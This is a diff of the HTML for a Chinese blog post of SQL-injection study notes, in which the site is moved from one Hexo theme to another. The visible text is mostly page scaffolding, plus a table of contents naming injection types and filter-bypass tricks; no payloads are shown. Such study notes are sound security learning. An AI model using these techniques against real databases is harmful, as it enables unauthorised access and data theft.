@@ -1,56 +1,272 @@
-<!DOCTYPE html><html lang="zh-CN"><head><!-- hexo injector head_begin start --><link href="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/css/index.css" rel="stylesheet"/><!-- hexo injector head_begin end --><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#00EE76"><meta name="author" content="Na0h_1e3"><meta name="copyright" content="Na0h_1e3"><meta name="generator" content="Hexo 5.3.0"><meta name="theme" content="hexo-theme-yun"><title>sql注入的一些基操 | Na0h的神光棒存放地</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
-  [".post-card",".post-content img"].forEach((target)=> {
-    ScrollReveal().reveal(target);
-  })
-});
-</script><link rel="shortcut icon" type="image/svg+xml" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#00EE76"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
-    const Yun = window.Yun || {};
-    window.CONFIG = {"hostname":"na0hblog.top","root":"/","title":["Na0h","的","神光棒存放地"],"version":"1.3.0","mode":"auto","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["0, 255, 127","0, 238, 118","0, 139, 69"]}};
-  </script><script>(function(){
-  var bp = document.createElement('script');
-  var curProtocol = window.location.protocol.split(':')[0];
-  if (curProtocol === 'https') {
-    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else {
-    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(bp, s);
-})();</script><meta name="description" content="学习sql注入的小笔记！">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql注入的一些基操">
-<meta property="og:url" content="http://na0hblog.top/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/index.html">
-<meta property="og:site_name" content="Na0h的神光棒存放地">
-<meta property="og:description" content="学习sql注入的小笔记！">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201026000612809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201026000457629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201026001519181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201122010323880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_10,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201122010435459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201122010553263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201122012406851.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20201124161940246.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2020-12-30T12:19:04.000Z">
-<meta property="article:modified_time" content="2020-12-30T13:55:24.617Z">
-<meta property="article:author" content="Na0h_1e3">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="sql注入">
-<meta property="article:tag" content="渗透">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201026000612809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Na0h_1e3"><img width="96" loading="lazy" src="/images/agif.gif" alt="Na0h_1e3"><span class="site-author-status" title="浮舟沧海">💯</span></a><div class="site-author-name"><a href="/about/">Na0h_1e3</a></div><a class="site-name" href="/about/site.html">Na0h的神光棒存放地</a><sub class="site-subtitle">一点诚心，万缘俱息</sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">9</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="主题文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="tencent://message?uin=1163435945" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/seldomlee" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=432232046" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/42264529" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="1163435945@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">sql注入原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E4%B8%8E%E6%B3%A8%E9%87%8A"><span class="toc-number">4.</span> <span class="toc-text">页面请求方式与注释</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%EF%BC%9AGET%E5%92%8CPOST"><span class="toc-number">4.1.</span> <span class="toc-text">请求方式：GET和POST</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E8%AF%B7%E6%B1%82"><span class="toc-number">4.1.1.</span> <span class="toc-text">GET请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">4.1.2.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hackbar"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">hackbar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#burp-suite"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">burp suite</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E6%96%B9%E5%BC%8F%EF%BC%9A-%E6%88%96%E2%80%93"><span class="toc-number">4.2.</span> <span class="toc-text">注释方式：#或–+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-number">4.3.</span> <span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">注入思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E5%8F%8A%E5%85%B6%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">5.1.</span> <span class="toc-text">判断注入点及其闭合方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">5.1.1.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">5.1.2.</span> <span class="toc-text">闭合方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">5.2.</span> <span class="toc-text">判断字段数及回显位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">5.2.1.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">5.2.2.</span> <span class="toc-text">判断回显位</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%BA%93%E4%B8%89%E8%A1%A8%E5%9B%9B%E5%AD%97%E6%AE%B5"><span class="toc-number">5.3.</span> <span class="toc-text">一库三表四字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.</span> <span class="toc-text">各种注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.4.1.</span> <span class="toc-text">union联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#floor%E5%87%BD%E6%95%B0"><span class="toc-number">5.4.2.1.</span> <span class="toc-text">floor函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updataxml%E5%87%BD%E6%95%B0"><span class="toc-number">5.4.2.2.</span> <span class="toc-text">updataxml函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue%E5%87%BD%E6%95%B0"><span class="toc-number">5.4.2.3.</span> <span class="toc-text">extractvalue函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.4.3.</span> <span class="toc-text">bool盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.4.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.5.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.6.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88GBK%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">5.4.7.</span> <span class="toc-text">宽字节注入（GBK双字节绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.8.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Agent"><span class="toc-number">5.4.9.</span> <span class="toc-text">User-Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.10.</span> <span class="toc-text">XFF注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.11.</span> <span class="toc-text">base64注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-number">6.</span> <span class="toc-text">SQL注入绕过技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">大小写绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">双写绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-number">6.3.</span> <span class="toc-text">编码绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-number">6.4.</span> <span class="toc-text">内联注释绕过注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.</span> <span class="toc-text">特殊符号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-number">6.5.1.</span> <span class="toc-text">空格过滤绕过注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#or-and-xor-not%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.2.</span> <span class="toc-text">or and xor not过滤绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.3.</span> <span class="toc-text">&#x3D;号过滤绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-gt-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.4.</span> <span class="toc-text">&lt;&gt;过滤绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7-%E5%8D%95%E3%80%81%E5%8F%8C-%E8%BF%87%E6%BB%A4%E7%BB%95%E9%9F%A9%E5%9B%BD"><span class="toc-number">6.5.5.</span> <span class="toc-text">引号(单、双)过滤绕韩国</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%8C%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.6.</span> <span class="toc-text">，过滤绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.7.</span> <span class="toc-text">函数绕过</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://na0hblog.top/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Na0h_1e3"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Na0h的神光棒存放地"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sql注入的一些基操<a class="post-edit-link" href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/sql注入的一些基操.md" target="_blank" title="编辑" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2020-12-30 20:19:04" itemprop="dateCreated datePublished" datetime="2020-12-30T20:19:04+08:00">2020-12-30</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">4.8k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">19m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/web/sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">sql注入</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">web</span></a><a class="tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">sql注入</span></a><a class="tag" href="/tags/%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">渗透</span></a></span></div><div class="post-author"><span class="author-name">Na0h_1e3</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#00EE76;"><a id="more"></a>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head><!-- hexo injector head_begin start --><link href="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/css/index.css" rel="stylesheet"/><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/txbb.jpg">
+  <link rel="icon" type="image/png" href="/img/txbb.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Na0h_1e3">
+  <meta name="keywords" content="Na0h1e3,blog,博客,web,ctf,渗透">
+  <title>sql注入的一些基操 - Na0h的神光棒存放地</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"na0hblog.top","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"🐳_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-MLL1PZ9RBK","gtag":260676474,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz","app_key":"y4AXlgIqQsV7Enr3IFS3r6Ck","server_url":"https://zjcv2ot3.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Na0h的神光棒存放地</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/textbg.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sql注入的一些基操">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-30 20:19" pubdate>
+        2020年12月30日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      59
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
